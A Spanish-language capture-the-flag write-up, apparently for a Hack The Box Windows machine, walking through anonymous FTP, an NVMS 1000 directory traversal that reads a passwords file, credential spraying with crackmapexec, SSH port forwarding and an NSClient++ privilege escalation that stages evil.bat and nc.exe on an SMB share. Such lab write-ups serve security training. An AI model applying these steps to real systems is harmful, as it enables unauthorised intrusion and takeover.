------------------------
#windows  #htb #lfi  #NseClient

-------------


- Empezamos como siempre haciendo un escaneo de nmap sobre los puertos viendo las versiones y lanzando scripts y nos encontramos lo siguiente.
![[Pasted image 20240322122652.png]]

- Vemos que tiene el puerto 21 con el ususario anonymous habilitado por lo que entramos y nos encontramos un directorio Users con varios archivos que nos vamos a poder descargar y traernos a nuestra maquina a ver que informacion podriamos obtener. Y nos encontramos con un arcvhivo dentro de cada usuario que nos da alguna pista pero realmente nada importante.
![[Pasted image 20240322123115.png]]

- Vamos a hechar un ojo a la pagina web y nos encontramos que estamos ante un #NVMS 1000 que es un sistema de monitorizacion. Vemos que no encontramos credenciales default pero sin embargo si buscamos exploits para este sistema nos encontramos un posible directory traversal.

![[Pasted image 20240322124459.png]]

- Podemos ver que funciona perfectamente y que nos deja listar el archivo passwrods.txt que habiamos visto que existia en las notas que nos habian dejado en el ftp y ahora hemos conseguido llegar hasta el.
![[Pasted image 20240322125325.png]]

- Asi que ahora teniendo credenciales vamos a probar un ataque de fuerza bruta con crackmapecxec para probar si alguno de estos usuarios fuese valido y asi llegar a entrar dentro y en efecto encontramos un usuario y una contraseña validos.
![[Pasted image 20240322125807.png]]


- Conseguimos acceso utilizando esas credenciales via ssh ya que no nos funcionan para ningun otro servicio.

- Dentro del sistema vimos que no podemos escalar nuestro privilegios de ninguna forma ya que no encontramos vias potenciales, entonces me fui a ver el escaneo de nmap en el cual encontramos un puerto abierto el cual esta corriendo una web por lo que nos fuimos a ver que era ese puerto y nos encontramos con un servicio NSClient++, el cual si buscamos vulnerabilidades aociadas encontramos una clara para poder escalar privilegios por lo que ya vimos que la maquina tenia pinta de tirar por ahi.

- Encontramos la contraseña del administrador siguiendo las instrucciones del exploit, pero a la hora de usarlas en el panel de autenticacion de la maquina victima no nos funciona ya que no nos permite conectarnos con una ip que no sea la de la maquina victima. Por lo que decicimos realizar un localportForwarding con ssh ya que estamos autenticados y nos en neceario que utilices chisel.
`sshpass -p <Password> ssh nadine@Ip -L 8443:127.0.0.1:8443`

- Una vez pudimos acceder desde el panel de login seguimos con las instrucciones del exploit, por lo que nos creamos un archivo evil.bat y lo compartimos junto al nc.exe creando con smbserver un recurso compartido pero que ademas nos crease un usurario y una contraseña para que nos permitiese loggearnos. `impackert-smbServer.py smbFolder $(pwd) -smb2support -uusername ruben -password ruben123`.  

- Y del lado de la maquina victima lo descargamos de la siguiente manera `net use x: \\ip\smbFolder /user:ruben ruben123` 

- Despues ya lo unico que debemos  de hacer es continuar siguiendo los pasos del exploit y conseguiremos ser Administrator en la maquina